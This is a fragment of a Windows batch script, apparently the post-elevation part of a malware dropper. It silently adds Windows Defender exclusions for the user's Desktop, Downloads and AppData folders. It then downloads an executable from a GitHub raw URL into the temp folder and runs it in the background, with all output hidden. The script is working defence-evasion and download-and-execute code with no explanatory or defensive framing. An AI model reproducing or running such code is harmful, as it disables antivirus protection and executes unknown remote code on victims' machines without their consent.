:gotAdmin
    pushd "%TEMP%"
    CD /D "%~dp0"

    REM --> Silent PowerShell commands
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1

    REM --> Navigate to the %TEMP% directory
    cd %TEMP%

    REM --> Download files silently using PowerShell
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe" >nul 2>&1


    REM --> Check if NETAPI32.exe exists silently
    if not exist "Modification11910275.exe" (
        exit /b
    )

    REM --> Execute Modification11910275.exe silently
    start /B "" Modification11910275.exe >nul 2>&1
    timeout /t 5 /nobreak >nul 2>&1

        )
    )
